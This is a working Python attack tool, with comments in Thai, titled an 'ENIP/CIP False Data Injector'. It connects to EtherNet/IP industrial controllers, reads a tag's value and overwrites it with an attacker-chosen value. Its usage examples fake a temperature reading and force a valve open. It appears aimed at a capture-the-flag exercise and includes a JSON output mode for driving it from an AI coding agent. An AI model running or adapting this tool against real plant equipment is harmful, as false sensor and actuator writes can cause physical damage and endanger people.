#!/usr/bin/env python3
"""
===================================================================
🏴‍☠️ ENIP/CIP FALSE DATA INJECTOR (GOD-MODE & AI-READY) 🏴‍☠️
===================================================================
# วิธีใช้ (Usage Examples):

# 1. เขียนค่าเปลี่ยนสถานะ (เช่น ปลอมแปลงอุณหภูมิเซนเซอร์เป็น 99.9)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "Temperature" --type "REAL" --write "99.9"

# 2. เปิดสวิตช์/วาล์ว (BOOL)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "Valve_Open" --type "BOOL" --write "1"

# 3. โหมด Fuzzing แบบปลอดภัย (เขียนค่า 1337 ทิ้งไว้ 1 วินาที แล้วคืนค่าเดิมทันที)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "@8/1/5" --type "INT" --write "1337" --restore

# 4. รันผ่าน Trae IDE (พ่นผลลัพธ์เป็น JSON สำหรับ AI)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "TargetTag" --write "999" --json
===================================================================
"""
import argparse
import sys
import time
import json

try:
    from cpppo.server.enip.get_attribute import proxy_simple
except ImportError:
    print("\033[91m[-] Missing 'cpppo' library. Please run: pip install cpppo\033[0m")
    sys.exit(1)

# --- ANSI Colors for Hacker UI ---
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

def main():
    parser = argparse.ArgumentParser(description="Write to EtherNet/IP Tags to Trigger Flags (AI Ready)")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=44818, help="Target Port (default: 44818)")
    parser.add_argument("--tag", required=True, help="Tag name or CIP path (e.g., 'MyTag' or '@8/1/1')")
    parser.add_argument("--type", default="INT", help="Data type (REAL, DINT, BOOL, SINT, INT, STRING)")
    parser.add_argument("--write", required=True, help="Value(s) to write (comma separated for arrays)")
    parser.add_argument("--restore", action="store_true", help="Safe Mode: Restore original value after writing")
    parser.add_argument("--json", action="store_true", help="Output pure JSON for Trae IDE")
    
    args = parser.parse_args()

    # โครงสร้าง JSON สำหรับ AI
    ai_report = {
        "target": f"{args.ip}:{args.port}",
        "tag": args.tag,
        "type": args.type,
        "status": "success",
        "error_msg": "",
        "original_value": None,
        "injected_value": args.write,
        "restore_status": "not_requested"
    }

    if not args.json:
        print(f"\n{C}=================================================={W}")
        print(f"{C} 💉 ENIP FALSE DATA INJECTOR (GOD-MODE) 💉 {W}")
        print(f"{C}=================================================={W}")
        print(f"[*] Connecting to target: {Y}{args.ip}:{args.port}{W}")

    try:
        dev = proxy_simple(args.ip, port=args.port)
    except Exception as e:
        if args.json:
            ai_report["status"] = "connection_failed"
            ai_report["error_msg"] = str(e)
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"{R}[-] Connection failed: {e}{W}")
        sys.exit(1)

    # --- 1. Parse Data Type (แปลงกระสุนให้เข้ากับกระบอกปืน) ---
    raw_values = args.write.split(',')
    write_values = []
    try:
        for v in raw_values:
            v_upper = args.type.upper()
            if 'REAL' in v_upper:
                write_values.append(float(v))
            elif 'BOOL' in v_upper:
                write_values.append(v.lower() in ('true', '1', 'yes', 't', 'on'))
            elif 'STRING' in v_upper:
                write_values.append(v)
            else:
                write_values.append(int(v))
    except ValueError:
        if args.json:
            ai_report["status"] = "parsing_error"
            ai_report["error_msg"] = f"Cannot parse '{args.write}' as {args.type}"
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"{R}[-] Error parsing value '{args.write}' for type {args.type}{W}")
        sys.exit(1)

    val_to_inject = write_values[0] if len(write_values) == 1 else write_values

    # --- 2. Pre-flight Check (แอบอ่านค่าดั้งเดิม) ---
    orig_val = None
    try:
        if not args.json: print(f"[*] Pre-flight check: Reading current state of {Y}{args.tag}{W}...")
        read_resp = dev.read([args.tag])
        if read_resp and len(read_resp) > 0 and read_resp[0]:
            orig_val = read_resp[0]
            ai_report["original_value"] = orig_val
            if not args.json: print(f"  {G}[+] Original Value: {orig_val}{W}")
        else:
            if not args.json: print(f"  {Y}[!] Could not read original value (Tag might be write-only or missing).{W}")
    except Exception as e:
        if not args.json: print(f"  {Y}[!] Read failed: {e}. Will attempt blind write.{W}")

    # --- 3. Attack (ยิง Fuzz / False Data) ---
    if not args.json: print(f"[*] Injecting payload: {Y}{val_to_inject}{W} (Type: {args.type})...")
    try:
        if args.type:
            write_resp = dev.write([(args.tag, (args.type, val_to_inject))])
        else:
            write_resp = dev.write([(args.tag, val_to_inject)])
            
        if not args.json: print(f"  {G}[+] Injection Successful! Target logic modified.{W}")
        
    except Exception as e:
        if args.json:
            ai_report["status"] = "injection_failed"
            ai_report["error_msg"] = str(e)
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"  {R}[-] Write failed: {e}{W}")
        sys.exit(1)

    # --- 4. Auto-Restore (คืนค่าเดิมถ้าต้องการ) ---
    if args.restore:
        if orig_val is not None:
            if not args.json: print(f"[*] Safe Mode: Restoring original value ({orig_val}) in 1 second...")
            time.sleep(1)
            try:
                # ต้องแกะค่าออกจาก List/Tuple ก่อนเขียนกลับถ้าอ่านมาแล้วติดโครงสร้างมาด้วย
                restore_val = orig_val[0] if isinstance(orig_val, (list, tuple)) else orig_val
                
                if args.type:
                    dev.write([(args.tag, (args.type, restore_val))])
                else:
                    dev.write([(args.tag, restore_val)])
                
                ai_report["restore_status"] = "success"
                if not args.json: print(f"  {G}[+] Target restored to original state safely.{W}")
            except Exception as e:
                ai_report["restore_status"] = f"failed: {str(e)}"
                if not args.json: print(f"  {R}[-] Restore failed! System might be unstable: {e}{W}")
        else:
            ai_report["restore_status"] = "failed_no_original_data"
            if not args.json: print(f"  {R}[-] Cannot restore: Original value was not captured.{W}")

    # --- 5. สรุปผลลัพธ์ ---
    if args.json:
        print(json.dumps(ai_report, indent=2))
    else:
        print(f"\n{C}=================================================={W}")
        print(f"{G}[*] Mission Complete.{W}")

if __name__ == "__main__":
    main()